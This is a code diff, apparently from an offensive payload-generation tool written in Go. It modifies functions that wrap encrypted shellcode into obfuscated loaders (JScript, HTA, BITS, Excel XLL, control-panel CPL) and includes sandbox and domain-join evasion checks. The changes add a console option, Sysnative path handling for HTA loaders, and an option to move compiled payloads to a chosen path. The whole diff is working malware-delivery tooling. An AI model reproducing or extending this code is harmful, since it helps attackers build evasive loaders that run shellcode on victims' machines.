@@ -712,7 +712,11 @@ func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, 
 	}
 
 	if sandbox == true {
-		Binary.Variables["SandboxOS"] = `"os"`
+		if console == true {
+			Binary.Variables["SandboxOS"] = ""
+		} else {
+			Binary.Variables["SandboxOS"] = `"os"`
+		}
 		Binary.Variables["IsDomainJoined"] = Cryptor.VarNumberLength(10, 19)
 		Binary.Variables["domain"] = Cryptor.VarNumberLength(10, 19)
 		Binary.Variables["status"] = Cryptor.VarNumberLength(10, 19)
@@ -865,7 +869,7 @@ func Shellcode_Buff(b64ciphertext string, b64key string, b64iv string, FuncName 
 
 }
 
-func JScriptLoader_Buff(name string, filename string, mode string, sandbox bool) (string, string, string) {
+func JScriptLoader_Buff(name string, filename string, mode string, sandbox bool, CommandLoader string) (string, string, string) {
 	var LoaderTemplate string
 	var buffer bytes.Buffer
 	JScriptLoader := &JScriptLoader{}
@@ -897,6 +901,11 @@ func JScriptLoader_Buff(name string, filename string, mode string, sandbox bool)
 		JScriptLoader.Variables["dllext"] = ".dll"
 		JScriptLoader.Variables["filename"] = filename
 		JScriptLoader.Variables["FileName"] = name
+		if CommandLoader == "hta" {
+			JScriptLoader.Variables["System32"] = "Sysnative"
+		} else {
+			JScriptLoader.Variables["System32"] = "System32"
+		}
 	}
 	if mode == "wscript" {
 		JScriptLoader.Variables["dllext"] = ".dll"
@@ -1126,7 +1135,7 @@ func CompileFile(b64ciphertext string, b64key string, b64iv string, mode string,
 	Utils.ModuleObfuscator(name, FuncName)
 	return name, filename
 }
-func CompileLoader(mode string, outFile string, filename string, name string, CommandLoader string, URL string, sandbox bool, Sha bool) {
+func CompileLoader(mode string, outFile string, filename string, name string, CommandLoader string, URL string, sandbox bool, Sha bool, path string) {
 	if mode == "excel" {
 		os.Rename(name+".dll", name+".xll")
 	} else if mode == "control" {
@@ -1140,6 +1149,9 @@ func CompileLoader(mode string, outFile string, filename string, name string, Co
 				outFile = name + ".cpl"
 				Utils.Command(URL, CommandLoader, outFile)
 			}
+			if path != "" {
+				Utils.FileMover(name, path)
+			}
 			return
 		}
 	} else if mode == "wscript" {
@@ -1150,6 +1162,9 @@ func CompileLoader(mode string, outFile string, filename string, name string, Co
 		os.Chdir("..")
 		os.Rename(name+"/"+name+".exe", name+".exe")
 		os.RemoveAll(name)
+		if path != "" {
+			Utils.FileMover(name, path)
+		}
 		fmt.Println("[+] Binary Compiled")
 		if CommandLoader == "bits" {
 			outFile = name + ".exe"
@@ -1162,10 +1177,13 @@ func CompileLoader(mode string, outFile string, filename string, name string, Co
 		os.RemoveAll(name)
 		fmt.Println("[+] DLL Compiled")
 		fmt.Println("[!] Note: Loading a dll (with Rundll32 or Regsvr32) that has the same name as a valid system DLL will cause problems, in this case its best to change the name slightly")
+		if path != "" {
+			Utils.FileMover(name, path)
+		}
 		return
 	}
 	fmt.Println("[*] Creating Loader")
-	code, fso, dropPath := JScriptLoader_Buff(name, filename, mode, sandbox)
+	code, fso, dropPath := JScriptLoader_Buff(name, filename, mode, sandbox, CommandLoader)
 	f, _ := os.Open(filename)
 	reader := bufio.NewReader(f)
 	content, _ := ioutil.ReadAll(reader)
@@ -1195,5 +1213,8 @@ func CompileLoader(mode string, outFile string, filename string, name string, Co
 		Utils.Sha256(outFile)
 	}
 	os.RemoveAll(name)
+	if path != "" {
+		Utils.FileMover(outFile, path)
+	}
 	fmt.Println("[+] Loader Compiled")
 }
